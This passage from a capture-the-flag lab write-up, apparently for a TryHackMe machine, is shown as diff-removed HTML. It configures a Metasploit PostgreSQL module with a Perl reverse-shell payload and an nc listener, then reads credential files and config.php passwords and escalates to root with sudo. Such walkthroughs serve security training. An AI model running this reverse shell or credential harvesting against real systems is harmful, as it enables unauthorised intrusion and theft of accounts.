-   USERNAME  postgres         no        The username <span class="hljs-built_in">to</span> authenticate <span class="hljs-keyword">as</span>
-
-
-Payload options (cmd/unix/reverse_perl):
-
-   Name   Current Setting  Required  Description
-   <span class="hljs-comment">----   ---------------  --------  -----------</span>
-   LHOST                   yes       The listen address (<span class="hljs-keyword">an</span> interface may be spe
-                                     cified)
-   LPORT  <span class="hljs-number">4444</span>             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   <span class="hljs-comment">--  ----</span>
-   <span class="hljs-number">0</span>   Automatic
-</code></pre><p>RHOSTS = Target IP</p>
-<p>Also we have to specify our lissening address and port</p>
-<p>LHOST  tun0 IP from <code>ifconfig -a</code>
-LPORT  4444 
-PASSWORD </p>
-<p>When we have it setted up we have to start lissening: </p>
-<pre><code>nc -lvnp <span class="hljs-number">4444</span>
-</code></pre><p>Then <code>run</code> the payload and you gonna get the shell access</p>
-<hr>
-<h3 id="13-make-a-simple-enumeration-and-escalate-privileges">13. Make a simple enumeration and escalate privileges</h3>
-<pre><code>$ cat <span class="hljs-regexp">/etc/</span>passwd
-<span class="hljs-comment">#/home/dark/credentials.txt</span>
-</code></pre><pre><code>cat <span class="hljs-meta-keyword">/home/</span>dark/credentials.txt
-<span class="hljs-symbol">dark:</span>qwerty1234<span class="hljs-meta">#!hackme</span>
-</code></pre><h4 id="ssh">SSH</h4>
-<p>ssh dark@poster.thm
-password: <code>qwe****34#!hackme</code></p>
-<pre><code>sudo -l 
-Sorry, user dark may <span class="hljs-keyword">not</span> <span class="hljs-built_in">run</span> sudo <span class="hljs-keyword">on</span> ubuntu.
-</code></pre><p>But when we check /var/www/html/config.php then we will be able to obtain alison credentials.</p>
-<pre><code>$ cat /var/www/html/config.php
-<span class="php"><span class="hljs-meta">&lt;?php</span> 
-
-        $dbhost = <span class="hljs-string">"127.0.0.1"</span>;
-        $dbuname = <span class="hljs-string">"alison"</span>;
-        $dbpass = <span class="hljs-string">"p4ssw0rdS3***"</span>;
-        $dbname = <span class="hljs-string">"mysudopassword"</span>;
-<span class="hljs-meta">?&gt;</span></span>$
-</code></pre><pre><code><span class="hljs-meta">?&gt;</span>$ su - alison
-</code></pre><p><code>sudo -l</code></p>
-<pre><code>alison<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l
-[sudo] password <span class="hljs-keyword">for</span> <span class="hljs-symbol">alison:</span> 
-Matching Defaults entries <span class="hljs-keyword">for</span> alison on <span class="hljs-symbol">ubuntu:</span>
-    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span>
-    <span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>
-
-User alison may run the following commands on <span class="hljs-symbol">ubuntu:</span>
-    (ALL : ALL) ALL
-</code></pre><p>We have privileges to everything so we can just type <code>sudo su</code> and we become a root user.</p>
-<pre><code>alison<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo su
-root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/home/alison</span><span class="hljs-comment">#</span>
-</code></pre><p>So now we are able to obtain root.txt</p>
-<pre><code>root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ls</span>
-root.txt
-cat root.txt
-THM{c0ngrats_for_read_the_f1le_w*****}
-</code></pre>
 
 </main>
 
